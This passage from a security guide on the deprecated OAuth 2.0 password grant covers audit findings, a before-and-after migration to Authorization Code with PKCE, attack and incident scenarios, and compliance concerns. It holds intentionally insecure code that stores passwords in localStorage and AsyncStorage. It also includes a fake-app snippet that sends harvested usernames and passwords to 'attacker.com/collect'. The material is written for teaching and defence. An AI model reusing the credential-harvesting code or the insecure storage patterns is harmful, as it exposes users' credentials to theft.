    const response = await fetch('https://auth.company.com/token', {
      method: 'POST',
      headers: {
        'Authorization': 'Basic ' + btoa('crm-app:secret123')
      },
      body: new URLSearchParams({
        grant_type: 'password',
        username: username,
        password: password,
        scope: 'crm.read crm.write'
      })
    });
    
    if (!response.ok) {
      alert('Login failed. Please check your credentials.');
      return;
    }
    
    const tokens = await response.json();
    
    // **DANGER:** Store password for "convenience"
    localStorage.setItem('username', username);
    localStorage.setItem('password', btoa(password));  // Base64 "encryption"
    localStorage.setItem('access_token', tokens.access_token);
    
    this.showDashboard();
  }
  
  // Auto-login on app start
  async autoLogin() {
    const username = localStorage.getItem('username');
    const password = atob(localStorage.getItem('password') || '');
    
    if (username && password) {
      await this.login(username, password);
    }
  }
}

// Security issues present:
// 1. Password sent to client application
// 2. Password stored in localStorage (encoded, not encrypted)
// 3. No consent screen (users don't know what permissions app has)
// 4. Cannot support MFA (company wants to add MFA but can't)
// 5. Cannot support SSO (company wants Azure AD SSO but can't)
// 6. Password changes break all sessions
```

#### Security Audit Findings

```
CRM Application Security Audit
===============================

CRITICAL FINDINGS:
1. Password Grant Usage
   - Severity: CRITICAL
   - CVSS: 8.5
   - Risk: Credential exposure to application
   - Evidence: grant_type=password in token requests
   
2. Credential Storage
   - Severity: CRITICAL
   - CVSS: 9.0
   - Risk: Passwords stored in localStorage
   - Evidence: localStorage.setItem('password', ...)
   
3. No MFA Support
   - Severity: HIGH
   - Impact: Cannot implement company MFA policy
   - Evidence: Password grant incompatible with standard MFA
   
4. No SSO Integration
   - Severity: HIGH
   - Impact: Cannot migrate to Azure AD SSO
   - Evidence: Password grant cannot use federated identity

RECOMMENDATIONS:
IMMEDIATE (30 days):
1. Remove password storage from localStorage
2. Reduce token lifetime to 5 minutes
3. Implement rate limiting
4. Add monitoring for suspicious activity

SHORT-TERM (90 days):
1. Begin migration to Authorization Code + PKCE
2. Implement new authentication flow
3. Test with pilot users
4. Plan rollout

MEDIUM-TERM (180 days):
1. Migrate all users to new flow
2. Deprecate password grant endpoint
3. Remove legacy authentication code
4. Enable MFA and SSO

DEADLINE: Password grant MUST be removed by 2025-12-31
```

### 13.2 Security Audit: Identifying Password Grant Usage

**Scenario:** Security team audits company's OAuth implementations.

#### Audit Process

```bash
# Step 1: Search codebase for password grant usage
grep -r "grant_type=password" .
grep -r "grant_type.*password" .
grep -r "password_grant" .

# Step 2: Check network traffic
# Monitor token endpoint requests:
# POST /token
# Body: grant_type=password&username=...&password=...

# Step 3: Review API logs
# Look for:
# - /token endpoint calls with grant_type=password
# - High volume of password grant requests
# - Failed authentication attempts

# Step 4: Scan for credential storage
grep -r "localStorage.*password" .
grep -r "setItem.*password" .
grep -r "sessionStorage.*password" .

# Step 5: Check mobile apps
# Android: Look for SharedPreferences password storage
# iOS: Look for UserDefaults password storage
```

#### Findings Report

```markdown
# OAuth Security Audit Report

## Executive Summary
CRITICAL: Multiple applications using deprecated OAuth 2.0 Password Grant

## Applications Affected
1. **CRM Application**
   - Users: 500
   - Risk: HIGH
   - Password storage: YES (localStorage)
   
2. **Mobile Sales App**
   - Users: 200
   - Risk: CRITICAL
   - Password storage: YES (SharedPreferences)
   
3. **Desktop Dashboard**
   - Users: 150
   - Risk: HIGH
   - Password storage: NO (good)

## Risk Assessment

### Immediate Risks
| Risk | Likelihood | Impact | Overall |
|------|-----------|--------|---------|
| Credential theft | HIGH | CRITICAL | CRITICAL |
| Phishing attacks | HIGH | HIGH | CRITICAL |
| Compliance violation | HIGH | HIGH | CRITICAL |
| Cannot implement MFA | CERTAIN | HIGH | CRITICAL |

### Compliance Impact
- **PCI DSS:** Fails requirement 8.2.1 (credential security)
- **GDPR:** Excessive credential exposure (Art. 32)
- **SOC 2:** Inadequate access controls
- **HIPAA:** Insufficient authentication (if applicable)

## Remediation Plan

### Phase 1: Immediate (0-30 days)
- [ ] Disable password storage in all apps
- [ ] Implement rate limiting
- [ ] Add security monitoring
- [ ] Reduce token lifetimes to 5 minutes

### Phase 2: Short-term (31-90 days)
- [ ] Design Authorization Code + PKCE architecture
- [ ] Implement new auth flow
- [ ] Begin pilot migration
- [ ] User communication plan

### Phase 3: Medium-term (91-180 days)
- [ ] Roll out new authentication to all users
- [ ] Deprecate password grant endpoints
- [ ] Remove legacy authentication code
- [ ] Enable MFA and SSO

### Phase 4: Long-term (181-365 days)
- [ ] Complete migration verification
- [ ] Remove password grant entirely
- [ ] Security review of new implementation
- [ ] Update security policies

## Budget Estimate
- Development: $150,000
- Testing: $30,000
- User training: $20,000
- Total: $200,000

## Timeline
Start: Immediately
Completion: 12 months
Hard deadline: 2025-12-31 (OAuth 2.1 compliance)
```

### 13.3 Migration Scenario: Before and After

#### Before Migration (Password Grant)

```javascript
// Mobile app - Password Grant (INSECURE)
class OldMobileApp {
  async signIn() {
    // Get credentials from UI
    const username = this.usernameInput.value;
    const password = this.passwordInput.value;
    
    try {
      // Authenticate with password grant
      const response = await fetch('https://auth.example.com/token', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({
          grant_type: 'password',
          username: username,        // ❌ Client sees password
          password: password,        // ❌ Client sees password
          client_id: 'mobile-app',
          scope: 'profile orders'
        })
      });
      
      const tokens = await response.json();
      
      // Store credentials for "convenience" ❌ DANGER
      await AsyncStorage.setItem('username', username);
      await AsyncStorage.setItem('password', password);
      await AsyncStorage.setItem('access_token', tokens.access_token);
      
      this.navigateToHome();
    } catch (error) {
      this.showError('Login failed');
    }
  }
  
  // Auto-login on app start ❌ Uses stored password
  async autoSignIn() {
    const username = await AsyncStorage.getItem('username');
    const password = await AsyncStorage.getItem('password');
    
    if (username && password) {
      await this.signIn();  // Re-uses stored password
    }
  }
}

// Issues with this approach:
// - Password visible to client code
// - Password stored on device
// - No MFA support
// - No SSO support
// - Password changes break app
// - Phishing risk (users trained to enter password in app)
```

#### After Migration (Authorization Code + PKCE)

```javascript
// Mobile app - Authorization Code + PKCE (SECURE)
import { AuthSession } from 'expo-auth-session';
import * as WebBrowser from 'expo-web-browser';

class NewMobileApp {
  async signIn() {
    // Generate PKCE
    const codeVerifier = this.generateCodeVerifier();
    const codeChallenge = await this.generateCodeChallenge(codeVerifier);
    
    // Configure authorization request
    const authRequest = {
      response_type: 'code',
      client_id: 'mobile-app-v2',
      redirect_uri: 'myapp://callback',
      scope: 'profile orders',
      code_challenge: codeChallenge,
      code_challenge_method: 'S256',
      state: this.generateState()
    };
    
    // Open browser for authentication
    // ✓ User sees auth server domain
    // ✓ App never sees password
    // ✓ Supports MFA
    // ✓ Supports SSO/federated identity
    const result = await AuthSession.startAsync({
      authUrl: 'https://auth.example.com/authorize?' + 
               new URLSearchParams(authRequest).toString()
    });
    
    if (result.type === 'success') {
      const { code } = result.params;
      
      // Exchange code for tokens
      const tokens = await this.exchangeCodeForTokens(code, codeVerifier);
      
      // Store ONLY refresh token (NOT password) ✓
      await SecureStore.setItemAsync('refresh_token', tokens.refresh_token);
      await SecureStore.setItemAsync('access_token', tokens.access_token);
      
      this.navigateToHome();
    }
  }
  
  // Auto-login uses refresh token (NOT password) ✓
  async autoSignIn() {
    const refreshToken = await SecureStore.getItemAsync('refresh_token');
    
    if (refreshToken) {
      try {
        // Use refresh token to get new access token
        const tokens = await this.refreshAccessToken(refreshToken);
        await SecureStore.setItemAsync('access_token', tokens.access_token);
        
        // Update refresh token if rotated
        if (tokens.refresh_token) {
          await SecureStore.setItemAsync('refresh_token', tokens.refresh_token);
        }
        
        this.navigateToHome();
      } catch (error) {
        // Refresh failed, need to re-authenticate
        await this.signIn();
      }
    }
  }
  
  async refreshAccessToken(refreshToken) {
    const response = await fetch('https://auth.example.com/token', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: new URLSearchParams({
        grant_type: 'refresh_token',
        refresh_token: refreshToken,
        client_id: 'mobile-app-v2'
      })
    });
    
    return await response.json();
  }
  
  // PKCE helper functions
  generateCodeVerifier() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return this.base64URLEncode(array);
  }
  
  async generateCodeChallenge(verifier) {
    const encoder = new TextEncoder();
    const data = encoder.encode(verifier);
    const hash = await crypto.subtle.digest('SHA-256', data);
    return this.base64URLEncode(new Uint8Array(hash));
  }
  
  base64URLEncode(buffer) {
    return btoa(String.fromCharCode(...buffer))
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=/g, '');
  }
}

// Benefits of new approach:
// ✓ App never sees password
// ✓ No password storage
// ✓ Full MFA support
// ✓ SSO/federated identity support
// ✓ Password changes don't break app
// ✓ User sees auth server domain (phishing resistant)
// ✓ Explicit consent screen
// ✓ OAuth 2.1 compliant
```

### 13.4 Attack Scenario: Malicious Client Harvesting Credentials

**Scenario:** Attacker creates fake mobile app to harvest credentials.

#### Attack Timeline

```
Day 1: Attacker creates fake app
-------
- Mimics popular banking app
- Looks identical to real app
- Uses password grant (because users expect to enter password in app)

const fakeApp = {
  async login(username, password) {
    // Harvest credentials
    await fetch('https://attacker.com/collect', {
      method: 'POST',
      body: JSON.stringify({
        app: 'FakeBankApp',
        victim: username,
        password: password,
        timestamp: Date.now()
      })
    });
    
    // Also authenticate with real bank (stealth)
    await fetch('https://real-bank.com/token', {
      method: 'POST',
      body: new URLSearchParams({
        grant_type: 'password',
        username: username,
        password: password,
        client_id: 'malicious-client'
      })
    });
    
    // App "works" - user doesn't suspect theft
  }
};

Day 2-7: Distribution
-------
- Posted on unofficial app stores
- Distributed via phishing emails
- Social media promotion
- 1,000 downloads

Day 8-30: Credential Collection
-------
- Users enter real credentials (trained by legitimate apps)
- 800 users successfully authenticate
- 800 valid credentials harvested
- Users don't suspect anything (app works normally)

Day 31: Attacker Uses Credentials
-------
- Login to victim accounts
- Transfer funds
- Access personal data
- Sell credentials on dark web

Day 35: Incident Detected
-------
- Multiple fraud reports
- Investigation begins
- Fake app identified
- Too late - credentials already stolen

Impact:
-------
- 800 compromised accounts
- $2.5M in fraudulent transactions
- Massive PR damage
- Regulatory fines
- Customer trust destroyed
```

**Why this attack works with password grant:**
- Users trained to enter passwords in apps
- No way to verify app authenticity before entering password
- No browser domain to check
- App can look identical to legitimate app

**Why this attack fails with Authorization Code + PKCE:**
```
Day 1: Attacker creates fake app

Day 2: User clicks "Sign In"
- App opens browser to: https://fake-bank.com/authorize
- User sees URL in browser: "This isn't real-bank.com!"
- User closes browser, doesn't enter credentials
- Attack fails
```

### 13.5 Incident Response: Password Grant Abuse Detected

**Scenario:** Security team detects suspicious password grant usage.

#### Incident Timeline

```
T0 (Day 1, 02:00 AM): Anomaly Detection Alert
-------
Security monitoring: Spike in password grant token requests
- Normal rate: 10 requests/minute
- Current rate: 500 requests/minute
- Source: Multiple IPs (botnet)
- Pattern: Credential stuffing attack

T1 (Day 1, 02:05 AM): Initial Assessment
-------
SOC analyst reviews:
- 30,000 password grant attempts in 5 minutes
- 150 successful authentications (0.5% success rate)
- Indicates stolen credential list being tested
- Multiple user accounts compromised

T2 (Day 1, 02:10 AM): Immediate Response
-------
Actions taken:
1. Enable aggressive rate limiting (1 attempt/minute/IP)
2. Temporarily disable password grant endpoint
3. Alert affected users
4. Force password resets for compromised accounts

T3 (Day 1, 02:30 AM): Incident Commander Engaged
-------
IC decisions:
- Declare P1 security incident
- Engage security team
- Notify executive team
- Prepare customer communication

T4 (Day 1, 03:00 AM): Forensic Analysis
-------
Findings:
- Credential list from previous data breach (other service)
- Password reuse enabled successful logins
- Attacker used stolen tokens to access user data
- 150 accounts compromised
- Estimated data exposure: PII for 150 users

T5 (Day 1, 06:00 AM): Containment Complete
-------
- All compromised tokens revoked
- Affected users forced to reset passwords
- Password grant endpoint remains disabled
- Monitoring for continued attack

T6 (Day 1, 12:00 PM): Customer Communication
-------
Email to affected users:
"Your account was accessed by an unauthorized party. 
We have reset your password and revoked all access tokens.
Please set a new password and enable MFA."

T7 (Day 2-7): Post-Incident Analysis
-------
Root cause: Password grant enabled credential stuffing
- Attack succeeded because password grant accepts any credentials
- No MFA challenged attackers
- Rate limiting was insufficient

Recommendations:
1. IMMEDIATE: Keep password grant disabled
2. 30 DAYS: Migrate all apps to Authorization Code + PKCE
3. 60 DAYS: Remove password grant entirely
4. 90 DAYS: Mandatory MFA for all users

T8 (Day 30): Permanent Fix
-------
- All applications migrated to Authorization Code + PKCE
- Password grant endpoint removed
- MFA required for all authentications
- Enhanced monitoring in place

Lessons Learned:
-------
1. Password grant creates attack surface for credential stuffing
2. Even with rate limiting, attacks can succeed
3. MFA cannot be effectively implemented with password grant
4. Migration to proper OAuth flows is urgent, not optional

Cost of Incident:
-------
- Investigation: 500 hours
- Customer support: 200 hours
- Development (migration): 1000 hours
- PR damage: Significant
- User trust: Damaged
- Regulatory scrutiny: Ongoing

Prevention:
-------
If application had used Authorization Code + PKCE:
- Credential stuffing attack would not have worked
- Attackers could not automate authentication
- MFA would have blocked attacks
- Incident would not have occurred
```

---

## 14. Regulatory and Compliance Considerations

### 14.1 PCI DSS (Payment Card Industry Data Security Standard)

**Relevant Requirements:**

| Requirement | Impact of Password Grant | Compliance Risk |
|-------------|------------------------|-----------------|
| **8.2.1** - Use strong cryptography to render authentication credentials unreadable | Passwords transmitted to client (even if encrypted in transit) | **HIGH RISK** |
| **8.2.3** - Passwords/passphrases must meet minimum strength | Client could log weak passwords without detection | **MEDIUM RISK** |
| **8.2.4** - Change user passwords at least every 90 days | Password changes break all clients using password grant | **MEDIUM RISK** |
| **8.2.5** - Do not allow an individual to submit a new password identical to previous | Client could store and reuse old passwords | **HIGH RISK** |
| **8.3** - Secure all individual non-console administrative access and all remote access using MFA | Password grant makes MFA implementation difficult/impossible | **CRITICAL RISK** |

**Auditor concerns:**
- "How do you ensure client applications don't store passwords?"
- "How do you implement MFA with password grant?"
- "How do you prevent credential theft from client applications?"
- "What controls prevent malicious clients from harvesting credentials?"

**Recommendation:** Password grant likely fails PCI DSS audit. Migrate to Authorization Code + PKCE.

### 14.2 GDPR (General Data Protection Regulation)

**Relevant Articles:**

| Article | Impact of Password Grant | Compliance Risk |
|---------|------------------------|-----------------|
| **Art. 25** - Data protection by design and by default | Password grant exposes credentials by design | **HIGH RISK** |
| **Art. 32** - Security of processing | Inadequate technical measures (credential exposure) | **HIGH RISK** |
| **Art. 33** - Notification of personal data breach | Password grant increases breach likelihood | **MEDIUM RISK** |
| **Art. 5(1)(f)** - Integrity and confidentiality | Password exposed to client violates confidentiality | **HIGH RISK** |

**Data Protection Impact Assessment (DPIA) considerations:**
```
Risk Assessment: Password Grant Flow
====================================

Data Processed: User credentials (username, password)
Processing Activity: Authentication
Data Categories: Special category (authentication credentials)

Risks Identified:
1. CREDENTIAL EXPOSURE TO CLIENT
   Likelihood: HIGH
   Impact: SEVERE
   Risk Level: CRITICAL
   
   Mitigation: ❌ Cannot adequately mitigate
   Reason: Credential exposure is inherent to flow design
   
2. UNAUTHORIZED ACCESS
   Likelihood: MEDIUM
   Impact: SEVERE
   Risk Level: HIGH
   
   Mitigation: ⚠️ Partial (rate limiting, monitoring)
   Reason: Client compromise leads to credential theft
   
3. DATA BREACH
   Likelihood: MEDIUM
   Impact: SEVERE
   Risk Level: HIGH
   
   Mitigation: ❌ Cannot adequately mitigate
   Reason: Stored credentials in client create breach risk

DPIA Conclusion:
Password grant presents unacceptable data protection risks.
RECOMMENDATION: Do not use password grant.
ALTERNATIVE: Authorization Code Flow with PKCE provides adequate protection.
```

**Supervisory authority concerns:**
- Credential exposure to third parties (clients)
- Lack of technical measures to protect credentials
- Increased likelihood of data breaches
- Failure to implement data protection by design

### 14.3 SOC 2 (Service Organization Control 2)

**Relevant Trust Service Criteria:**

| Criterion | Impact of Password Grant | Audit Risk |
|-----------|------------------------|-----------|
| **CC6.1** - Logical and physical access controls | Inadequate control over credential access | **HIGH** |
| **CC6.6** - System operations restricted to authorized users | Client can access credentials outside intended scope | **HIGH** |
| **CC6.7** - Transmission of data protected | Credentials transmitted to client | **MEDIUM** |
| **CC7.2** - Confidentiality commitments protected | Credential confidentiality compromised | **HIGH** |

**Auditor testing procedures:**
```
SOC 2 Type II Audit - Authentication Controls
==============================================

Control: User authentication uses secure OAuth 2.0 flows

Test 1: Review authentication implementation
Result: ❌ EXCEPTION NOTED
Finding: Application uses OAuth 2.0 Password Grant
Issue: Password credentials exposed to client application
Risk: HIGH
Recommendation: Migrate to Authorization Code Flow with PKCE

Test 2: Test MFA implementation
Result: ❌ EXCEPTION NOTED
Finding: MFA not implemented
Issue: Password grant incompatible with standard MFA
Risk: HIGH
Recommendation: Implement Authorization Code Flow to enable MFA

Test 3: Review credential storage
Result: ❌ EXCEPTION NOTED
Finding: Client applications store passwords
Issue: Passwords found in application storage
Risk: CRITICAL
Recommendation: Immediate remediation required

Auditor Conclusion:
-------------------
Controls DO NOT operate effectively.
Password grant creates unacceptable security risks.
RECOMMENDATION: Qualified opinion if not remediated.
TIMELINE: Must migrate by next audit period.
```

### 14.4 HIPAA (Health Insurance Portability and Accountability Act)

**Relevant Standards:**

| Standard | Impact of Password Grant | Compliance Risk |
|----------|------------------------|-----------------|
| **§164.312(a)(1)** - Access Control | Inadequate technical controls | **HIGH** |
| **§164.312(a)(2)(i)** - Unique user identification | Cannot reliably identify users | **MEDIUM** |
| **§164.312(a)(2)(iii)** - Automatic logoff | Difficult with stored passwords | **MEDIUM** |
| **§164.312(d)** - Person or entity authentication | Weak authentication mechanism | **HIGH** |

**Risk analysis considerations:**
- Password exposure increases PHI breach risk
- Cannot implement strong authentication (MFA)
- Client compromise could expose patient credentials
- Difficult to maintain audit trails

### 14.5 Industry Standards and Recommendations

**NIST (National Institute of Standards and Technology)**

NIST SP 800-63B (Digital Identity Guidelines):
- Recommends against password-based authentication where alternatives exist
- Emphasizes MFA for sensitive operations
- Password grant makes MFA implementation difficult

**OWASP (Open Web Application Security Project)**

OWASP Top 10 - A07:2021 Identification and Authentication Failures:
- Password grant increases authentication failure risk
- Credential stuffing attacks enabled
- Session management issues

**FIDO Alliance**

Passwordless Authentication Standards:
- Password grant contradicts passwordless movement
- Cannot integrate with FIDO2/WebAuthn
- Locks organizations into password-based authentication

### 14.6 Regulatory Response Template

```
Response to Regulatory Inquiry: OAuth Password Grant Usage
===========================================================

Date: [Date]
Regulator: [Name]
Reference: [Inquiry Reference]

ACKNOWLEDGMENT:
We acknowledge use of OAuth 2.0 Password Grant in legacy systems.

RISK RECOGNITION:
We recognize the following risks:
1. Credential exposure to client applications
2. Increased likelihood of security incidents
3. Inability to implement multi-factor authentication
4. Non-compliance with current OAuth 2.1 specification

CURRENT CONTROLS:
While password grant remains in use, we have implemented:
1. Restriction to first-party clients only
2. Client authentication required
3. Aggressive rate limiting (3 attempts/minute)
4. Comprehensive security monitoring
5. Short access token lifetimes (5 minutes)
6. Mandatory TLS 1.3+
7. Account lockout after failed attempts

MIGRATION PLAN:
We are actively migrating to OAuth 2.0 Authorization Code Flow with PKCE:

Timeline:
- Month 1-2: Design and development
- Month 3-4: Testing and pilot deployment
- Month 5-6: Production rollout
- Month 7: Complete migration
- Month 8: Password grant endpoint removal

Completion Date: [Specific Date]

We commit to providing monthly progress reports to the regulatory body.

EXECUTIVE ACCOUNTABILITY:
[Executive Name], [Title]
[Signature]
[Date]
```

---

## Appendix A: RFC Cross-Reference Index

| Topic | RFC 6749 | OAuth 2.1 | Security BCP |
|-------|----------|-----------|--------------|
| Password Grant definition | §4.3 | REMOVED | §2.4 (MUST NOT use) |
| Token request | §4.3.2 | - | - |
| Token response | §4.3.3 | - | - |
| Client authentication | §3.2.1 | §3.2.1 | - |
| Token endpoint security | §3.2 | §3.2 | - |
| Security considerations | §10 | - | §2.4 |

## Appendix B: Vulnerability Mode Quick Reference

| Toggle | Attack Demonstrated | Why Unfixable | Document Section |
|--------|-------------------|---------------|------------------|
| `PASSWORD_GRANT` | All password grant vulnerabilities | Credential exposure inherent | §7 |
| `PASSWORD_GRANT` + `LOG_CREDENTIALS` | Credential theft from client | Client must handle credentials | §7.1 |
| `PASSWORD_GRANT` + `FAKE_CLIENT` | Phishing via client impersonation | Users trained to enter passwords | §7.2 |
| `PASSWORD_GRANT` + `NO_RATE_LIMITING` | Credential stuffing | Large attack surface | §7.3 |
| `HTTP_TOKEN_ENDPOINT` | MITM credential capture | Client sees plaintext before HTTPS | §7.4 |
| `CLIENT_STORES_PASSWORD` | Password storage vulnerability | Clients want "remember me" | §7.5 |

## Appendix C: Migration Resources

- **OAuth 2.0 Security Best Current Practice:** https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics
- **OAuth 2.1 Draft:** https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1
- **PKCE Specification (RFC 7636):** https://datatracker.ietf.org/doc/html/rfc7636
- **Authorization Code Flow:** See `authorization-code-flow-with-pkce.md`
- **Device Authorization Flow:** See `device-authorization-flow.md`

---

## **FINAL WARNING**

```
================================================================================
                         DO NOT USE PASSWORD GRANT
================================================================================

This flow:
* VIOLATES OAuth's core principle
* EXPOSES user credentials to clients
* ENABLES phishing attacks
* PREVENTS MFA implementation
* BLOCKS federated identity
* FAILS compliance requirements
* IS REMOVED from OAuth 2.1

Use Authorization Code Flow with PKCE instead.

If you currently use password grant: MIGRATE IMMEDIATELY.

There are NO acceptable reasons to implement password grant in new applications.
There are NO acceptable reasons to delay migration from password grant.

================================================================================
```

---

*Document Version: 1.0.0*
*Last Updated: December 5, 2025*
*Status: DEPRECATED - FOR LEGACY REFERENCE ONLY*
*Specification References: RFC 6749 §4.3 (deprecated by Security BCP §2.4), OAuth 2.1 (flow removed)*

---

> *"The Resource Owner Password Credentials Grant was OAuth 2.0's acknowledgment that sometimes, you can't fix broken authentication systems overnight. Unfortunately, 'temporary' has a way of becoming 'permanent' in the world of enterprise software. If you're reading this in 2025 or later and still using password grant, please note that 'overnight' was a decade ago. Time to actually fix it."*
